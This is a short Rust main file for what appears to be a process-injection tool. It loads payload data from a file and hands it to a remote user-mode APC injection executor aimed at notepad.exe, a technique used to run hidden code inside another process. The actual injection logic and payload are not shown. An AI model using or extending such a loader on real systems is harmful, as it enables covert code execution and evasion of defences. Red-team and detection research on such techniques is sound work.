use shared::Executor;

fn main() -> anyhow::Result<()> {
    let data = shared::simple_load_from_file();
    let executor = apc_injection::RemoteUserAPCInjectionExecutor {
        process_name: "C:\\Windows\\System32\\notepad.exe".to_string(),
    };
    executor.execute(data)?;
    Ok(())
}
